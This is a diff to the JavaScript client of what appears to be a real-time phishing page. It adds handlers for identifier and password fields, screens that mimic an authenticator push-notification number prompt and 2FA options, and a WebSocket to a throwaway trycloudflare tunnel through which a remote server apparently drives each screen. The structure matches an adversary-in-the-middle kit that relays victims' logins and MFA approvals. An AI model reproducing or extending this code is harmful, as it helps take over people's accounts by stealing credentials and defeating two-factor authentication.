@@ -16,9 +16,12 @@ let currentDeviceName = null; // <--- Variable para guardar el nombre del dispos
 function showLoader() {
     // Busca el loader dentro del contenedor principal, sea cual sea su estado actual
     const loader = appContainer.querySelector('.bar-desactive, .bar');
-    if (loader) {
+    const loadScreen = appContainer.querySelector('.overlay-desactive');
+    if (loader && loadScreen) {
         loader.classList.remove('bar-desactive');
         loader.classList.add('bar');
+        loadScreen.classList.remove('overlay-desactive');
+        loadScreen.classList.add('overlay-active');
         console.log("Loader mostrado.");
     } else {
         console.error("Elemento loader no encontrado.");
@@ -31,9 +34,12 @@ function showLoader() {
  */
 function hideLoader() {
     const loader = appContainer.querySelector('.bar-desactive, .bar');
-    if (loader) {
+    const loadScreen = appContainer.querySelector('.overlay-active');
+    if (loader && loadScreen) {
         loader.classList.remove('bar');
         loader.classList.add('bar-desactive');
+        loadScreen.classList.remove('overlay-active');
+        loadScreen.classList.add('overlay-desactive');
         console.log("Loader oculto.");
     } else {
         // No necesariamente un error si la pantalla cambió y ya no existe
@@ -97,6 +103,39 @@ function clearScreen1Errors() {
     }
     console.log("Errores de Pantalla 1 limpiados (si existían).");
 }
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const emailInput = document.getElementById('identifierInput');
+  
+    emailInput.addEventListener('keydown', function (event) {
+      if (event.key === 'Enter') {
+        event.preventDefault(); // Evita comportamiento por defecto
+        this.blur(); // Quita el foco para cerrar el teclado
+        // Aquí puedes también simular el click en "Siguiente" si quieres:
+        document.getElementById('nextBtnScreen1').click();
+        clearScreen1Errors();
+      }
+    });
+  });
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const emailInput = document.getElementById('passwordInput');
+  
+    emailInput.addEventListener('keydown', function (event) {
+      if (event.key === 'Enter') {
+        event.preventDefault(); // Evita comportamiento por defecto
+        this.blur(); // Quita el foco para cerrar el teclado
+        // Aquí puedes también simular el click en "Siguiente" si quieres:
+        document.getElementById('nextBtnScreen2').click();
+        clearScreen1Errors();
+      }
+    });
+});
+  
+
+
 
 // ------------------------- LÓGICA PANTALLA 1 --------------------------- //
 
@@ -478,7 +517,7 @@ async function loadScreen(screenName, dynamicData = null) {
             console.log("Modificando HTML para AUTH_NOTIFICATION_PENDING...");
             const deviceToShow = currentDeviceName || 'tu dispositivo'; // Usar global o fallback
 
-            html = html.replace(/PLACEHOLDER_EMAIL/g, emailToShow);
+            html = html.replace(/PLACEHOLDER_EMAIL/g, emailToShow);//PLACEHOLDER_DEVICE_NAME
             html = html.replace(/PLACEHOLDER_DEVICE/g, deviceToShow); // Reemplaza todas las ocurrencias
 
             console.log("HTML modificado para AUTH_NOTIFICATION_PENDING.");
@@ -716,11 +755,11 @@ function handleWebSocketMessage(event) {
                  break;
 
 
-            case 'TEXT_AUTH_NOTIFICATION_PRESS_NUMBER_INDICATOR':
+            case 'AUTH_NOTIFICATION_PENDING_PRESS_NUMBER':
                 // El servidor está indicando que el usuario debe presionar un número.
                 hideLoader(); // Ocultar loader
                 // Aquí podrías mostrar un mensaje o cambiar la UI para indicar al usuario que presione un número
-                alert('Presiona el número indicado en la pantalla.');
+                loadScreen('AUTH_NOTIFICATION_PENDING_PRESS_NUMBER', message.payload);
                 break;
 
             case 'AUTH_2FA_OPTIONS_PRESENT':
@@ -815,7 +854,7 @@ function initWebSocket() {
     // Construye la URL completa y correcta para el WebSocket (ej: ws://192.168.5.52:8080)
     //const wsUrl = `ws://${wsHost}:8080`;
 
-    const cloudflareTunnelUrl = 'designed-metals-stephanie-javascript.trycloudflare.com'; // SOLO el hostname del túnel
+    const cloudflareTunnelUrl = 'candidates-postal-steel-uh.trycloudflare.com'; // SOLO el hostname del túnel
     const wsUrl = `wss://${cloudflareTunnelUrl}`;
 
     // Loguea la URL que se usará para la conexión (útil para depurar)
